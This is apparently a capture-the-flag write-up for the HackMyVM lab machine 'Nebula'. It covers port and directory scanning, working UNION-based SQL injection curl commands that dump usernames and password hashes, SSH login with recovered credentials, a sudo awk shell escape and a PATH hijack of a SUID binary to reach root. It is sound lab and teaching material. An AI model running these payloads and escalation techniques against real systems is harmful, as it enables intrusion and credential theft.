# Nebula

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.124:22
Open 10.0.2.124:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.124
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7MY5O2LUKPvRFggwsovmzCpW5dSH6rO4fTZTy0D0PlrAwkySPT1+V7ikkwImNsYo2vTh8xdQmCUBuCv+mdVbQnRhKzQbRgak+OSHWp5BJfpb5Iq5j/DUMRq9MT5ee+3RzhGkTF/zVax3aGRUobC3QLjnriLoEjHEeGgdqjsFMSFxB4t8o58On0AvnejqdjyqiSneFI+0fWQNm2TcJt6xYtSD18FQ0bDlJ00c93TTnlM8tN3TQhE5UpIz1jPVEdnohECqDkH0VU8j5G7GQF7vfymmEh7EkPlwiyUTMXmMXwiUhtJWd8z1osyrYS5/8NvEi8YPfkDDfh3EG1bmmuQiwb0L8GXYZhEV9mcYiUJyRLpx62oJCM4m5Xtv8yntW46uLVxXWhxZLe38ZM/Q2M82B0hpjvZVDej94B2tbiAlI947R3jWCX9VRw7Th+VKTxLzfXiWoZOsJBLDEUZXBXsN7215CdBCYko0XvS6faRhkYosN3Lo+KSPyQSyMeUi+tXs=
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIrzro2ocCH17rtB4CE6MUkSVNdjO9ZU+YsggCi0ortaRgFG46K+W+ISD8FCqHVK7fKTDwG4MvkyyiYJDil770E=
|   256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILira/bQHVz8kTlxinZ9Fpb105HxBkSDPckUs7r+uzY0
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Nebula Lexus Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/nebula/writeup.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.124 --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
200      GET      117l      627w    49089c http://10.0.2.124/img/image1
200      GET     1121l     5980w   469563c http://10.0.2.124/img/image2
200      GET       76l      291w     3479c http://10.0.2.124/
301      GET        9l       28w      306c http://10.0.2.124/img => http://10.0.2.124/img/
200      GET       76l      291w     3479c http://10.0.2.124/index.php
301      GET        9l       28w      308c http://10.0.2.124/login => http://10.0.2.124/login/

â””â”€$ feroxbuster -u http://10.0.2.124/ --thorough -D -C 404,400,414,500,403 --dont-scan .css,exit.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
301      GET        9l       28w      306c http://10.0.2.124/img => http://10.0.2.124/img/
301      GET        9l       28w      308c http://10.0.2.124/login => http://10.0.2.124/login/
200      GET      117l      627w    49089c http://10.0.2.124/img/image1
200      GET     1121l     5980w   469563c http://10.0.2.124/img/image2
200      GET       76l      291w     3479c http://10.0.2.124/
301      GET        9l       28w      309c http://10.0.2.124/joinus => http://10.0.2.124/joinus/
```

![writeup-1.png](/assets/pentest/hackmyvm/nebula/writeup-1.png)

In PDF:
```bash
The link will be like: https://nebulalabs.org/meetings?user=admin&password=d46df8e6a5627debf930f7b5c8f3b083
```

### SQLi

::: info Creds
`admin:d46df8e6a5627debf930f7b5c8f3b083`
:::

![writeup-2.png](/assets/pentest/hackmyvm/nebula/writeup-2.png)

SQLi works
- [https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#extract-database-with-information_schema](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#extract-database-with-information_schema)

```bash
# Databases
â””â”€$ curl 'http://10.0.2.124/login/search_central.php' -G --data-urlencode "id=' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata -- -" -s | htmlq 'td:last-child' -t
 information_schema,nebuladb

# Tables
â””â”€$ curl 'http://10.0.2.124/login/search_central.php' -G --data-urlencode "id=' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='nebuladb' -- -" -s | htmlq 'td:last-child' -t
 centrals,users,central

# Columns
â””â”€$ curl 'http://10.0.2.124/login/search_central.php' -G --data-urlencode "id=' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' -- -" -s | htmlq 'td:last-child' -t

 id,username,password,is_admin

# Rows
â””â”€$ curl 'http://10.0.2.124/login/search_central.php' -G --data-urlencode "id=' UNION SELECT username,password,is_admin FROM users -- -" -s  | html2markdown
Central ID:

| id          | role                             | username |
| ----------- | -------------------------------- | -------- |
| admin       | d46df8e6a5627debf930f7b5c8f3b083 | 1        |
| pmccentral  | c8c605999f3d8352d7bb792cf3fdb25b | 0        |
| Frederick   | 5f823f1ac7c9767c8d1efbf44158e0ea | 0        |
| Samuel      | 4c6dda8a9d149332541e577b53e2a3ea | 0        |
| Mary        | 41ae0e6fbe90c08a63217fc964b12903 | 0        |
| hecolivares | 5d8cdc88039d5fc021880f9af4f7c5c3 | 0        |
| pmccentral  | c8c605999f3d8352d7bb792cf3fdb25b | 1        |
```

## SSH (pmccentral)

![writeup-3.png](/assets/pentest/hackmyvm/nebula/writeup-3.png)

::: info Creds
`pmccentral:999999999`
:::

```bash
â””â”€$ sshpass -p '999999999' ssh pmccentral@10.0.2.124
Warning: Permanently added '10.0.2.124' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
...
pmccentral@laboratoryuser:~$ id
uid=1001(pmccentral) gid=1001(pmccentral) groups=1001(pmccentral)
```

## Privilege Escalation (laboratoryadmin)

```bash
pmccentral@laboratoryuser:~$ find . -type f -ls
   393275      4 -rw-r--r--   1 pmccentral pmccentral      220 Dec 16  2023 ./.bash_logout
   393276      4 -rw-r--r--   1 pmccentral pmccentral     3771 Dec 16  2023 ./.bashrc
   393287      0 -rw-r--r--   1 pmccentral pmccentral        0 Dec 17  2023 ./.cache/motd.legal-displayed
   393272      4 -rw-r--r--   1 root       root            875 Dec 17  2023 ./documents/employees.txt
   393284      4 -rw-------   1 pmccentral pmccentral      304 Dec 17  2023 ./.bash_history
   393277      4 -rw-r--r--   1 pmccentral pmccentral      807 Dec 16  2023 ./.profile

pmccentral@laboratoryuser:~$ cat ./documents/employees.txt
aren
Aarika
Abagael
Abagail
Abbe
Abbey
...
Alexia
Alexina
Alexine
Alexis
```

```bash
pmccentral@laboratoryuser:~$ sudo -l
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
```

- [https://gtfobins.github.io/gtfobins/awk/#sudo](https://gtfobins.github.io/gtfobins/awk/#sudo)

```bash
pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
laboratoryadmin@laboratoryuser:/home/pmccentral$ id
uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```

### User.txt

```bash
laboratoryadmin@laboratoryuser:~$ cat user.txt
flag{$udOeR$_Pr!V11E9E_I5_7En53}
```

## Privilege Escalation (root)

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -alh
total 32K
drwxr-xr-x 2 laboratoryadmin laboratoryadmin 4.0K Dec 18  2023 .
drwx------ 8 laboratoryadmin laboratoryadmin 4.0K Dec 18  2023 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin    8 Dec 18  2023 head
-rwsr-xr-x 1 root            root             17K Dec 17  2023 PMCEmployees
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
aren
Aarika
Abagael
Abagail
Abbe
Abbey
Abbi
Abbie
Abby
Abbye
Showing top 10 best employees of PMC company

laboratoryadmin@laboratoryuser:~/autoScripts$ strings PMCEmployees
...
[]A\A]A^A_
Showing top 10 best employees of PMC company
head /home/pmccentral/documents/employees.txt
:*3$"
...
```

SUID binary is using relative path for binaries which exposes it to PATH variable attack. We can influence the PATH from shell. 
```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ PATH=.:$PATH ./PMCEmployees
root@laboratoryuser:~/autoScripts# id
uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```

::: info Note
I don't think `head` file was meant to be there ðŸ˜…
:::

### Root.txt

```bash
root@laboratoryuser:~/autoScripts# cat /root/root.txt
flag{r00t_t3ns0}
```

